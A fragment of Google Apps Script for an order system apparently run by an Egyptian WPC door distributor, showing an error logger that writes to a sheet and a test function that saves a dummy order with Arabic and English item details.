      sh.setRightToLeft(false);
      sh.appendRow(['Timestamp', 'Error']);
      sh.setFrozenRows(1);
    }
    sh.appendRow([new Date(), String(err && err.stack ? err.stack : err)]);
  } catch (e) {}
}

/* ============================================================
   اختبار سريع — شغّله من المحرر بعد ما تلزق الكود.
   لازم يظهرلك سطر تجريبي في الشيت، امسحه بعد كده.
   ============================================================ */
function testOrder() {
  saveOrder_({
    id: 'W-TEST-1',
    ts: Date.now(),
    name: 'Test Distributor',
    phone: '01000000000',
    region: 'Tanta',
    warehouse: 'مصنع إنشاص',
    total: 11623.64,
    msg: 'Test message',
    items: [
      { kind: 'door', title: 'باب WPC A05 — بني', titleEn: 'WPC Door A05 - Brown',
        code: 'A05', sizeTxt: '90 سم', sizeEn: '90 cm', unitPrice: 5400, qty: 2,
        frame: 10, dbror: '6×9', mill: 'smart', millAr: 'سمارت', millEn: 'Smart' },
      { kind: 'frame', key: 'حلق15', spec: '15 سم', title: 'حلق باب 15 سم — عود 2.15 م',
        titleEn: 'Door Frame 15 cm - 2.15m rod', price: 309.90, qty: 2 },
      { kind: 'bror', key: 'برور6×9', spec: '6×9', title: 'برور 6×9 — عود 2.15 م',
        titleEn: 'Bror 6x9 - 2.15m rod', price: 170.84, qty: 1 },
      { kind: 'acc', title: 'جوان', titleEn: 'Gasket', price: 6, qty: 5.5, unit: 'متر' }
    ]
  });
}
